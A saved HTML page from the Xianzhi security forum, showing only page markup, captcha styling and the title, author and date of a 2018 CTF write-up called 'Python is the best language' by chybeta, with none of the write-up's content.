<!DOCTYPE html>
<!-- saved from url=(0043)https://xianzhi.aliyun.com/forum/topic/2216 -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <title>Python is the best language-Writeup - 先知社区</title>
    <meta name="description" content="先知社区，先知安全技术社区">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <link rel="icon" href="https://xianzhi.aliyun.com/forum/static/icon/favicon.ico" type="image/x-icon">
    <!-- Le styles -->
    <link href="./Python is the best language-Writeup - 先知社区_files/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="./Python is the best language-Writeup - 先知社区_files/OverlayStyle.css">
    <link rel="stylesheet" href="./Python is the best language-Writeup - 先知社区_files/editormd.min.css">
    <link rel="stylesheet" href="./Python is the best language-Writeup - 先知社区_files/tango.css">
    <link rel="stylesheet" href="./Python is the best language-Writeup - 先知社区_files/topic.css">
    <link rel="stylesheet" href="./Python is the best language-Writeup - 先知社区_files/beautify.css">
    <link href="./Python is the best language-Writeup - 先知社区_files/bootstrap-responsive.min.css" rel="stylesheet">
    
    <link rel="stylesheet" href="./Python is the best language-Writeup - 先知社区_files/editormd.css">
    <link rel="stylesheet" href="./Python is the best language-Writeup - 先知社区_files/tango.css">
    <link rel="stylesheet" href="./Python is the best language-Writeup - 先知社区_files/jquery.fancybox.min.css">

    <!--[if lte IE 8]>
        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
    <![endif]-->
    <!--[if !IE]> -->
    <script type="text/javascript" src="./Python is the best language-Writeup - 先知社区_files/jquery-2.1.3.min.js.下载"></script>
    <!-- <![endif]-->
    <script src="./Python is the best language-Writeup - 先知社区_files/bootstrap.min.js.下载"></script>
    <script src="./Python is the best language-Writeup - 先知社区_files/xz.js.下载"></script>
    
    
    
    <script type="text/javascript" charset="utf-8" src="./Python is the best language-Writeup - 先知社区_files/nc.js.下载"></script><style>@charset "utf-8";
@font-face{font-family:'nc_iconfont';src:url("//at.alicdn.com/t/font_1465353706_4784257.eot");src:url("//at.alicdn.com/t/font_1465353706_4784257.eot?#iefix") format('embedded-opentype'),url("//at.alicdn.com/t/font_1465353706_4784257.woff") format('woff'),url("//at.alicdn.com/t/font_1465353706_4784257.ttf") format('truetype'),url("//at.alicdn.com/t/font_1465353706_4784257.svg#iconfont") format('svg')}@font-face{font-family:'ncpc_iconfont';src:url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.eot");src:url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.eot?#iefix") format('embedded-opentype'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.woff") format('woff'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.ttf") format('truetype'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.svg#ncpc_iconfont") format('svg')}.nc-container div#nc-loading-circle{background:transparent;width:20px;height:20px;display:inline-block;position:relative;vertical-align:middle}.nc-container div#nc-loading-circle .sk-circle{background:transparent;width:100%;height:100%;position:absolute;left:0;top:0}.nc-container #nc-loading-circle .sk-circle:before{content:'';display:block;margin:0 auto;width:15%;height:15%;background-color:#818181;border-radius:100%;-webkit-animation:sk-circleFadeDelay 1.2s infinite ease-in-out both;animation:sk-circleFadeDelay 1.2s infinite ease-in-out both}.nc-container #nc-loading-circle .sk-circle2{-webkit-transform:rotate(30deg);-ms-transform:rotate(30deg);transform:rotate(30deg)}.nc-container #nc-loading-circle .sk-circle3{-webkit-transform:rotate(60deg);-ms-transform:rotate(60deg);transform:rotate(60deg)}.nc-container #nc-loading-circle .sk-circle4{-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.nc-container #nc-loading-circle .sk-circle5{-webkit-transform:rotate(120deg);-ms-transform:rotate(120deg);transform:rotate(120deg)}.nc-container #nc-loading-circle .sk-circle6{-webkit-transform:rotate(150deg);-ms-transform:rotate(150deg);transform:rotate(150deg)}.nc-container #nc-loading-circle .sk-circle7{-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.nc-container #nc-loading-circle .sk-circle8{-webkit-transform:rotate(210deg);-ms-transform:rotate(210deg);transform:rotate(210deg)}.nc-container #nc-loading-circle .sk-circle9{-webkit-transform:rotate(240deg);-ms-transform:rotate(240deg);transform:rotate(240deg)}.nc-container #nc-loading-circle .sk-circle10{-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.nc-container #nc-loading-circle .sk-circle11{-webkit-transform:rotate(300deg);-ms-transform:rotate(300deg);transform:rotate(300deg)}.nc-container #nc-loading-circle .sk-circle12{-webkit-transform:rotate(330deg);-ms-transform:rotate(330deg);transform:rotate(330deg)}.nc-container #nc-loading-circle .sk-circle2:before{-webkit-animation-delay:-1.1s;animation-delay:-1.1s}.nc-container #nc-loading-circle .sk-circle3:before{-webkit-animation-delay:-1s;animation-delay:-1s}.nc-container #nc-loading-circle .sk-circle4:before{-webkit-animation-delay:-.9s;animation-delay:-.9s}.nc-container #nc-loading-circle .sk-circle5:before{-webkit-animation-delay:-.8s;animation-delay:-.8s}.nc-container #nc-loading-circle .sk-circle6:before{-webkit-animation-delay:-.7s;animation-delay:-.7s}.nc-container #nc-loading-circle .sk-circle7:before{-webkit-animation-delay:-.6s;animation-delay:-.6s}.nc-container #nc-loading-circle .sk-circle8:before{-webkit-animation-delay:-.5s;animation-delay:-.5s}.nc-container #nc-loading-circle .sk-circle9:before{-webkit-animation-delay:-.4s;animation-delay:-.4s}.nc-container #nc-loading-circle .sk-circle10:before{-webkit-animation-delay:-.3s;animation-delay:-.3s}.nc-container #nc-loading-circle .sk-circle11:before{-webkit-animation-delay:-.2s;animation-delay:-.2s}.nc-container #nc-loading-circle .sk-circle12:before{-webkit-animation-delay:-.1s;animation-delay:-.1s}@-webkit-keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}@-webkit-keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}@keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}.nc-container .scale_text2 #nc-loading-circle .sk-circle:before{background-color:#fff}.nc_iconfont{font-family:"nc_iconfont";color:#ff3f08;font-size:16px;font-style:normal}.ncpc_iconfont{font-family:"ncpc_iconfont";color:#ff3f08;font-size:16px;font-style:normal}.captcha-error .icon_ban{float:left;font-size:16px;padding-right:5px;line-height:14px}.clickCaptcha_text .btn_refresh{font-style:normal;cursor:pointer;background:#fff;color:#737383}.imgCaptcha .btn_refresh{font-size:20px;cursor:pointer;background:#fff;color:#737383}.nc_voice{display:none;position:relative;margin-top:-34px;z-index:99;width:auto;height:34px;background:#fff}.omeo-code-img,.omeo-code-audio{font-size:0;text-align:left}.omeo-code-audiobox,.omeo-code-img a,.omeo-code-audio a,.omeo-code-state{display:inline-block;*display:inline;zoom:1;height:32px;vertical-align:top;font-size:12px}.omeo-code .omeo-code-refresh{background:transparent;width:32px;height:32px;font-size:20px;color:#888;text-align:center;text-decoration:none;padding-left:4px;line-height:32px}.omeo-code .omeo-switch{display:none;width:32px;height:32px;border-left:1px solid #e1e1e1;background-image:url("//g.alicdn.com/sd/ncpc/images/checkcode.png");background-repeat:no-repeat}.omeo-img-active .omeo-code-img{display:block}.omeo-img-active .omeo-code-audio{display:none}.omeo-code-img img{border:1px solid #cdcdcd;cursor:pointer}.omeo-code-img .omeo-switch{background-position:9px -41px}.omeo-audio-active .omeo-code-audio{display:block}.omeo-audio-active .omeo-code-img{display:none}.omeo-code-refresh{position:relative;left:95px}.omeo-code-audiobox{position:relative;height:30px;line-height:32px;border:1px solid #e1e1e1;text-align:center;overflow:hidden;left:100px;top:1px;width:45%;min-width:80px;background-color:#eee}.omeo-code-audiobox a{display:block;text-decoration:none;color:#06c}.omeo-code-audiobox-playing a{visibility:hidden}.omeo-code-audiobox span,.omeo-code-audiobox b{visibility:hidden;position:absolute;top:0;left:0;height:30px;font-weight:100;overflow:hidden}.omeo-code-audiobox-playing span,.omeo-code-audiobox-playing b{visibility:visible}.omeo-code-audiobox span{z-index:0;width:0;background:#186bca}.omeo-code-audiobox b{width:100%;z-index:1;text-align:left;text-indent:30px;color:#999;background:url("//g.alicdn.com/sd/ncpc/images/checkcode.png") no-repeat 14px -89px}.omeo-code-audio .omeo-switch{background-position:5px 10px}input[type=text]::-ms-clear{display:none}.omeo-box{position:relative;background-color:#fff}.omeo-code-echo{position:absolute;top:2px;left:2px}.omeo-code-echo input{padding:5px;height:18px;line-height:18px;border:1px solid #ddd;width:80px;outline:0}.omeo-code-state{height:30px;line-height:30px;text-indent:25px;white-space:nowrap;background-image:url("//g.alicdn.com/sd/ncpc/images/checkcode.png");background-repeat:no-repeat;background-position:100px 100px}.omeo-code-echo .omeo-code-state-error{width:auto;background-position:7px -193px}.omeo-code-echo .omeo-code-state-success{position:absolute;width:30px;background-position:7px -243px}.omeo-code-state{position:absolute;left:0;top:28px}.nc_voice_close{display:inline-block;position:relative;cursor:pointer;left:95px;top:0;border-left:#ddd 2px solid;padding:0 0 0 7px;background-color:#fff;font-size:20px;color:#888;line-height:32px}.nc_help{position:absolute;width:100%;height:100%;left:0;top:0;z-index:99999}.nc_help .mask{background-color:#000;opacity:.5;filter:alpha(opacity=50);width:100%;height:100%;top:0;left:0}.nc_btn_close{position:absolute;height:20px;left:500px;border-radius:20px;padding:10px 30px;background-color:#aaa;color:#fff;cursor:pointer;z-index:10}.nc_btn_close:hover{background-color:#afafaf}.nc_hand{position:absolute;width:68px;height:53px;background-image:url("//g.alicdn.com/sd/ncpc/images/hand.png");z-index:3}.nc_slide_bg{z-index:3;font-size:12px;text-align:center;color:#fff;line-height:34px}.nc_voicebtn{position:absolute;padding:0;right:-25px;font-size:23px;color:#888;cursor:pointer;line-height:34px}.nc_helpbtn{position:absolute;cursor:pointer;right:-95px;top:4px;font-size:12px;background-color:#ffb668;color:#fff;padding:4px;border-radius:2px;line-height:18px;display:none}.nc_helpbtn:before{width:0;height:0;content:"";position:absolute;left:-2px;top:6px;border-top:4px solid transparent;border-bottom:4px solid transparent;border-right:4px solid #ffb668}.nc-container .errloading{border:#faf1d5 1px solid;text-indent:3px;background-image:none;font-size:12px;width:290px;line-height:20px;padding:7px 5px 8px 5px;color:#ef9f06;}.nc-container .errloading a{color:#30a7fc}.nc_captcha_text .nc_err{float:left;text-indent:0}.button_move{transition:left .5s;-moz-transition:left .5s;-webkit-transition:left .5s;-o-transition:left .5s}.bg_move{transition:width .5s;-moz-transition:width .5s;-webkit-transition:width .5s;-o-transition:width .5s}.nc_slide_box{position:absolute}.nc_captcha_text{height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal}.nc-container .nc_captcha_img_text{width:auto;height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal;display:none;padding:0 0 10px 0;background-position:0 0;}.nc-container .nc_captcha_img_text span.nc-lang-cnt{line-height:inherit}.nc-container .imgCaptcha .nc_captcha_img_text{width:auto}.nc_captcha_img_text{height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal;display:none;padding:0 0 10px 3px;background-position:0 0}.nc-container .nc_wrapper{width:auto}.nc_scale{width:auto;height:34px;background:#e8e8e8;position:relative;margin:0;padding:0}.nc_scale.is_audio{margin-right:25px}.nc-container .nc_scale div{height:auto}.nc-container .nc_scale ul{list-style:none}.nc-container .nc_scale .btn_slide{color:#737383;background-image:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.nc-container .nc_scale span{text-align:center;width:40px;height:32px;line-height:32px;border:1px solid #ccc;position:absolute;left:0;cursor:move;background:#fff;z-index:2}.nc-container .nc_scale span.nc-lang-cnt{*line-height:34px;float:none;width:auto;height:auto;*height:34px;border:none;position:static;cursor:inherit;background:none;z-index:0;display:inline}.nc_slide_button{width:40px;height:32px;border:1px solid #ccc;position:absolute;left:0;cursor:move;background:#fff url("//g.alicdn.com/sd/ncpc/images/rt.png") no-repeat center;z-index:2}@media screen and (-ms-high-contrast:active),(-ms-high-contrast:none){.nc_scale span{height:32px}}.nc-container .nc_scale .btnok{cursor:default;background:#fff url("//g.alicdn.com/sd/ncpc/images/yes.png") no-repeat center;z-index:3}.nc-container .nc_scale .btnok2{cursor:default;font-size:20px;background:#fff url("//g.alicdn.com/sd/ncpc/images/no.png") no-repeat center;z-index:3}.nc-container .nc_scale .btn_warn{cursor:default;color:#ff3f08;line-height:34px;text-align:center;font-size:20px;background:#fff;z-index:3}.nc-container .clickCaptcha_text .btn_refresh{font-size:20px}.nc-container .clickCaptcha_text .icon_close{line-height:30px;margin-left:8px;cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:2px;background:transparent;z-index:3}.nc-container .nc_captcha_img_text .icon_close{cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:4px;background:transparent;z-index:3;line-height:18px}.nc-container .errloading .icon_warn{cursor:default;color:#ff3f08;font-size:18px;float:left;background:transparent;z-index:3}.nc-container .nc_scale .btn_ok{cursor:default;line-height:34px;text-align:center;font-size:20px;background:#fff;z-index:3;color:#76c61d}.nc-container .nc_scale .nc_ok,.nc-container .nc_scale .nc_bg{background:#7ac23c}.nc-container .nc_scale .nc_bg{position:absolute;height:100%;_height:34px;left:0;width:10px}.nc-container .nc_scale div.redbar{background:#fc461e;opacity:.5;filter:alpha(opacity=50)}.nc-container .nc_scale div.orange{background:#f00}.nc-container .nc_scale .scale_text{width:100%;height:100%;text-align:center;position:absolute;z-index:1;background:transparent;color:#9c9c9c;line-height:34px;font-size:12px;cursor:pointer}.nc-container .nc_scale .scale_text2{text-align:left;color:#fff;font-size:12px;text-indent:10px}.nc-container .nc_scale .scale_text2 b{padding-left:0;font-weight:normal}.nc-container .nc_scale .scale_text.scale_loading_text{text-align:center}.nc-container .nc_scale .imgCaptcha,.nc-container .nc_scale .clickCaptcha{display:none;overflow:hidden;border:1px solid #ccc;background:#fff;z-index:20000;}.nc-container .nc_scale .imgCaptcha p.error span,.nc-container .nc_scale .clickCaptcha p.error span{line-height:normal}.nc-container .nc_scale .imgCaptcha{height:auto}.nc-container .nc_scale .clickCaptcha{position:absolute;left:0;top:35px;height:270px;background:#fff;display:none;}.nc-container .nc_scale .clickCaptcha p.error i{color:#ff3f08;font-style:normal}.nc-container .nc_scale .clickCaptcha div{position:static;clear:both;width:100%;background:#fff;height:auto}.nc-container .nc_scale .clickCaptcha .clickCaptcha_text{height:30px;line-height:30px;font-size:12px;color:#999;}.nc-container .nc_scale .clickCaptcha .clickCaptcha_text b{font-weight:normal}.nc_btn_2{position:absolute;right:0;top:0;cursor:pointer;margin:2px 9px 0 0}.nc_iconfont.nc_btn_2{position:absolute;right:0;top:0;cursor:pointer}.nc_iconfont.nc_btn_1{position:absolute;top:10px;right:5px}.nc_btn_1{top:10px;right:10px}.scale_text i{font-style:normal;border:none;position:static;cursor:default;color:#fffc00;background:none;display:inline;width:100%}.nc-container .clickCaptcha .clickCaptcha_img{margin:0 auto;clear:both;position:relative;}.nc-container .clickCaptcha .clickCaptcha_img img{width:230px;height:230px;margin-left:10px;margin-top:5px}.nc-container .clickCaptcha .clickCaptcha_btn{margin:10px 0 0 15px;position:relative;text-align:left;}.nc-container .clickCaptcha .clickCaptcha_btn img{cursor:pointer}.nc-container .imgCaptcha{position:absolute;left:0;top:35px;height:auto;padding-bottom:15px;border:1px solid #ccc;background:#fff;}.nc-container .imgCaptcha div{position:static;width:90%;background-color:#fff}.nc-container .imgCaptcha,.nc-container .clickCaptcha{text-align:left;}.nc-container .imgCaptcha a,.nc-container .clickCaptcha a{color:#ff3f08}.nc-container .imgCaptcha .imgCaptcha_text{height:42px;line-height:42px;width:120px;background:#fff;font-size:14px;text-align:left;color:#747474;float:left;margin-left:10px;}.nc-container .imgCaptcha .imgCaptcha_text input{margin-top:5px;height:30px;line-height:30px;font-size:14px;width:90px;background:#fff}.nc-container .imgCaptcha .imgCaptcha_text input:focus{outline:none;color:#bbb}.nc-container .imgCaptcha .imgCaptcha_btn{margin:0 0 0 12px;*margin-left:0;clear:both;padding-top:5px;width:90%;}.nc-container .imgCaptcha .imgCaptcha_btn img{cursor:pointer}.nc-container .imgCaptcha .nc_scale_submit{margin:0 auto;cursor:pointer;background-color:#fc461e;width:120px;height:32px;line-height:32px;color:#fff;text-align:center}.nc-container .imgCaptcha .imgCaptcha_img{margin:4px 0 0 100px;height:40px;width:130px;overflow:hidden;cursor:pointer;}.nc-container .imgCaptcha .imgCaptcha_img img{width:130px}.nc-container .imgCaptcha .imgCaptcha_img input{border:solid 1px #ccc}.nc-lang-ar_MA,.nc-lang-ar_SA,.nc-lang-iw_HE,.nc-lang-iw_IL{text-align:right;*text-align:left;}.nc-lang-ar_MA .nc_scale .scale_text2,.nc-lang-ar_SA .nc_scale .scale_text2,.nc-lang-iw_HE .nc_scale .scale_text2,.nc-lang-iw_IL .nc_scale .scale_text2{text-align:right;}.nc-lang-ar_MA .nc_scale .scale_text2 span,.nc-lang-ar_SA .nc_scale .scale_text2 span,.nc-lang-iw_HE .nc_scale .scale_text2 span,.nc-lang-iw_IL .nc_scale .scale_text2 span{*display:inline-block;padding:0 56px 0 0}.nc-lang-ar_MA .nc_captcha_img_text,.nc-lang-ar_SA .nc_captcha_img_text,.nc-lang-iw_HE .nc_captcha_img_text,.nc-lang-iw_IL .nc_captcha_img_text{*text-align:right}.nc-lang-ar_MA span.nc-lang-cnt,.nc-lang-ar_SA span.nc-lang-cnt,.nc-lang-iw_HE span.nc-lang-cnt,.nc-lang-iw_IL span.nc-lang-cnt{text-align:right;direction:rtl}.nocaptcha span.nc-lang-cnt{float:none;height:auto;line-height:30px}.nc-container{font-size:12px;-ms-touch-action:none;touch-action:none;}.nc-container p{margin:0;padding:0;display:inline}.nc-container .scale_text.scale_text span[data-nc-lang="_startTEXT"]{display:inline-block;width:100%}.nc-container .scale_text.scale_text.slidetounlock span[data-nc-lang="_startTEXT"]{background:-webkit-gradient(linear,left top,right top,color-stop(0,#4d4d4d),color-stop(.4,#4d4d4d),color-stop(.5,#fff),color-stop(.6,#4d4d4d),color-stop(1,#4d4d4d));-webkit-background-clip:text;-webkit-text-fill-color:transparent;-webkit-animation:slidetounlock 3s infinite;-webkit-text-size-adjust:none}.nc-container .nc_scale .nc-align-center.scale_text2{text-align:center;text-indent:-42px}@-webkit-keyframes slidetounlock{0%{background-position:-200px 0}100%{background-position:200px 0}}.nc-container.tb-login .clickCaptcha_text .icon_close{line-height:30px;margin-left:0;cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:0;background:transparent;z-index:3}.nc-container.tb-login{position:relative;margin-top:20px;display:none;}.nc-container.tb-login .nc_scale{width:auto;}.nc-container.tb-login .nc_scale .scale_text2{text-indent:-42px;text-align:center;}.nc-container.tb-login .nc_scale .scale_text2 b{padding:0}.nc-container.tb-login .nc_scale.nc_err div.scale_text{background:#f79977}.nc-container.tb-login .errloading{width:auto}.nc-container.tb-login .imgCaptcha,.nc-container.tb-login .clickCaptcha{width:252px;*width:256px;border:0;*height:300px;min-height:300px;max-height:inherit !important;}.nc-container.tb-login .imgCaptcha div.login-msg.error,.nc-container.tb-login .clickCaptcha div.login-msg.error{background:#fff2f2}.nc-container.tb-login .imgCaptcha .captcha-error,.nc-container.tb-login .clickCaptcha .captcha-error{position:absolute;top:0;width:244px;height:auto;margin-bottom:15px;padding:3px;border:solid 1px #ff8e8e;line-height:18px}.nc-container.tb-login .imgCaptcha .captcha-inform,.nc-container.tb-login .clickCaptcha .captcha-inform{font-size:110%;margin-left:20px}.nc-container.tb-login .imgCaptcha{padding-top:66px;}.nc-container.tb-login .imgCaptcha .imgCaptcha_text{width:100px;margin-left:0;}.nc-container.tb-login .imgCaptcha .imgCaptcha_text input:focus{color:#000}.nc-container.tb-login .imgCaptcha .imgCaptcha_img{width:120px;_width:100px}.nc-container.tb-login .imgCaptcha .imgCaptcha_btn{width:100%;margin-left:0}.nc-container.tb-login .imgCaptcha .nc_scale_submit{width:100%;height:36px;line-height:36px;margin-top:20px;margin-left:0;border-radius:3px;font-size:16px;font-family:Tahoma,Helvetica,Arial,sans-serif;background:#ff3f08}.nc-container.tb-login .clickCaptcha{padding-top:40px;}.nc-container.tb-login .clickCaptcha .clickCaptcha_text{text-indent:4px}.nc-container.tb-login .clickCaptcha .clickCaptcha_img img{margin-left:10px}.nc-container.tb-login .nc_btn_1{top:77px;_top:57px}.nc-container.tb-login .nc_btn_2{top:36px}.login .nc-container.tb-login .login-msg p,.login-box .nc-container.tb-login .login-msg p{width:auto;float:left}.nc-container.tb-login.nc-old-login{margin:20px 0 10px 0;width:250px;}.nc-container.tb-login.nc-old-login .nc_wrapper{width:250px}.nc-container.tb-login.nc-old-login .imgCaptcha,.nc-container.tb-login.nc-old-login .clickCaptcha{width:250px;min-height:auto;}.nc-container.tb-login.nc-old-login .imgCaptcha .captcha-error,.nc-container.tb-login.nc-old-login .clickCaptcha .captcha-error{line-height:16px}.nc-container.tb-login.nc-old-login .clickCaptcha{padding-top:28px;}.nc-container.tb-login.nc-old-login .clickCaptcha .clickCaptcha_img img{width:200px;height:200px}.nc-container.nc-old-login.show-click-captcha{padding-bottom:60px}.nc-container.nc-old-login.show-click-captcha.nc-tm-min-fix{padding-bottom:40px}.nc-container.tb-login.nc-tm-min-fix .clickCaptcha{max-height:340px !important}#content .login-box .bd .nc-container.tb-login .login-msg{margin:10px auto 15px auto}#content .login-box .bd .nc-container.tb-login.nc-old-login.show-click-captcha .login-msg{margin:2px 0 0 0}.nc-container .nc_scale .nc-cc{display:none;position:absolute;left:0;top:35px;z-index:20000;width:360px;height:570px;border:1px solid #5eaef1;border-radius:4px;background:#fff;font-size:14px;line-height:18px;color:#333;}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-btn{background-color:#90c1eb}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-refresh,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-refresh{cursor:default}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-refresh,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-refresh{color:#999}.nc-container .nc_scale .nc-cc a{color:#3199f4;text-decoration:none}.nc-container .nc_scale .nc-cc .nc_iconfont{vertical-align:top;margin-right:8px}.nc-container .nc_scale .nc-cc-btn{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;width:100px;line-height:30px;text-align:center;background-color:#3199f4;color:#fff;border-radius:4px;cursor:pointer;}.nc-container .nc_scale .nc-cc-btn.nc-cc-disabled{background-color:#90c1eb;cursor:default}.nc-container .nc_scale .nc-cc-btn .nc-lang-cnt{line-height:18px}.nc-container .nc_scale .nc-cc-header{padding:20px 20px 19px 20px;height:100px;background:#f4f8fa;border-bottom:1px solid #ccc}.nc-container .nc_scale .nc-cc-img1-box{float:left;width:100px;height:100px;margin-right:16px}.nc-container .nc_scale .nc-cc-txt{overflow:hidden;*zoom:1;line-height:30px;padding-top:11px}.nc-container .nc_scale .nc-cc-img2-box{position:relative;padding:0 20px;margin-top:20px}.nc-container .nc_scale .nc-cc-items{position:absolute;left:20px;_left:0;top:0;width:320px;overflow:hidden}.nc-container .nc_scale .nc-cc-items-inner{margin-right:-20px}.nc-container .nc_scale .nc-cc-item{position:relative;display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;margin-right:10px;margin-bottom:10px;border:1px solid #ccc;width:98px;height:98px;background:url("//gtms02.alicdn.com/tps/i2/T1ty2QFNNXXXc6Yc2r-1-1.gif");}.nc-container .nc_scale .nc-cc-item:hover{border-color:#3199f4}.nc-container .nc_scale .nc-cc-item .nc_iconfont{display:none;position:absolute;right:0;bottom:0;color:#3199f4;font-size:22px;margin-right:0}.nc-container .nc_scale .nc-cc-item.nc-cc-selected .nc_iconfont{display:block}.nc-container .nc_scale .nc-cc-tip{display:none;position:absolute;left:0;bottom:60px;width:360px;line-height:18px;text-align:center;color:#eb4f38;}.nc-container .nc_scale .nc-cc-tip span{line-height:normal}.nc-container .nc_scale .nc-cc-footer{position:absolute;left:0;bottom:20px;width:360px;height:30px;line-height:30px;text-align:center;}.nc-container .nc_scale .nc-cc-footer .nc_iconfont{color:#c4cbd0}.nc-container .nc_scale .nc-cc-refresh,.nc-container .nc_scale .nc-cc-wait{position:absolute;left:20px;top:0;color:#3199f4;cursor:pointer}.nc-container .nc_scale .nc-cc-wait{display:none}.nc-container .nc_scale .nc-cc-cancel{position:absolute;right:20px;top:0;color:#3199f4;cursor:pointer;}.nc-container .nc_scale .nc-cc-cancel .nc_iconfont{position:relative;top:-1px}.nc-container .nc_scale .nc-cc-loading{margin-top:247px;text-align:center;line-height:14px}.nc-container .nc_scale .nc-cc-loading-img{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;vertical-align:middle;background:url("//img.alicdn.com/tps/TB1OdxsKpXXXXcgXFXXXXXXXXXX-14-14.gif") no-repeat;width:14px;height:14px;position:relative;top:-1px;margin-right:9px}.nc-container .nc_scale .nc-cc-fail{position:absolute;left:50%;top:50%;width:320px;height:180px;margin-left:-160px;margin-top:-90px;background:#fff;border-radius:4px}.nc-container .nc_scale .nc-cc-fail-inner{text-align:center;padding:55px 10px 10px}.nc-container .nc_scale .nc-cc-fail-action{margin:28px 0 18px;}.nc-container .nc_scale .nc-cc-fail-action a{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;line-height:30px;margin-left:16px}.nc-container .nc_scale .nc-cc-contact{text-align:right;color:#666;padding-right:9px}.nc-container .nc_scale .nc-cc-mask{display:none;position:absolute;left:0;top:0;width:360px;height:570px;background:rgba(0,0,0,0.3);filter:progid:DXImageTransform.Microsoft.gradient(enabled='true',startColorstr='#4C000000', endColorstr='#4C000000');}:root .nc-container .nc_scale .nc-cc-mask{-webkit-filter:none;filter:none}.nc-container .nc_scale .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-arrow-2{display:none;position:absolute;top:340px;border:solid transparent;height:0;width:0}.nc-container .nc_scale .nc-cc-arrow-1{border-width:16px;margin-top:-1px}.nc-container .nc_scale .nc-cc-arrow-2{border-width:15px}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-2,.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-2{display:block;_display:none}.nc-container .nc_scale .nc-cc-right{left:180px;top:-339px;}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-1{border-right-color:#5eaef1;left:-32px}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-2{border-right-color:#fff;left:-30px}.nc-container .nc_scale .nc-cc-left{left:-335px;top:-339px;}.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-1{border-left-color:#5eaef1;right:-32px}.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-2{border-left-color:#fff;right:-30px}</style>
    <script src="./Python is the best language-Writeup - 先知社区_files/editormd.min.js.下载"></script>
    <script src="./Python is the best language-Writeup - 先知社区_files/jquery.fancybox.min.js.下载"></script>
    <script src="./Python is the best language-Writeup - 先知社区_files/modal.min.js.下载"></script>


</head>
<body style="">
<!-- navbar begin -->
<div class="navbar navbar-default">
    <div class="navbar-inner">
        <div class="container" style="text-align: center;">
            <!--[if lte IE 8]>
            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
            <![endif]-->
            <div class="brand-box">
                <a class="brand" href="https://xianzhi.aliyun.com/forum/"></a>
            </div>
            
                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Ftopic%2F2216&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding">
                    登录</a>
            
            <div class="nav-collapse collapse">
                <div class="search d1">
                    <form method="get" action="https://xianzhi.aliyun.com/forum/search">
                        <input type="text" placeholder="" name="keyword">
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
<!-- navbar end -->
<!-- main content begin -->
<div id="Wrapper" class="container">
    
    
    <div class="row2">
        <div class="span10">
            
    

    <script src="./Python is the best language-Writeup - 先知社区_files/jquery.toc.min.js.下载"></script>
    <script src="./Python is the best language-Writeup - 先知社区_files/toc.min.js.下载"></script>
    <script src="./Python is the best language-Writeup - 先知社区_files/dt.js.下载"></script>


<div class="row box content">
    
    <div class="box-container">
        <div class="main-topic">
            <div class="clearfix user-info topic-list">
                <p><span class="content-title ">Python is the best language-Writeup</span>
                </p>
                <div class="topic-info">
                <span class="info-left">
                    <a href="https://xianzhi.aliyun.com/forum/user/2551">
                        <span class="username cell"> chybeta</span></a> <span class="i-seprator"> / </span>
                    <span> 2018-03-25 21:15:36</span><span class="i-seprator"> / </span>
                    <span>浏览数 102</span>
                    
                    

                    <span class="content-node">
                    
                        <span class="label label-default label-node-first">
                            <a href="https://xianzhi.aliyun.com/forum/tab/1">安全技术</a></span>
                        <span class="label label-default">
                            <a href="https://xianzhi.aliyun.com/forum/node/13">CTF</a></span>
                    
                    </span>
                </span>
                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(2216);">
             顶(0)</a>
             <a class="vote vote-down" href="javascript:" onclick="voteDown(2216);">
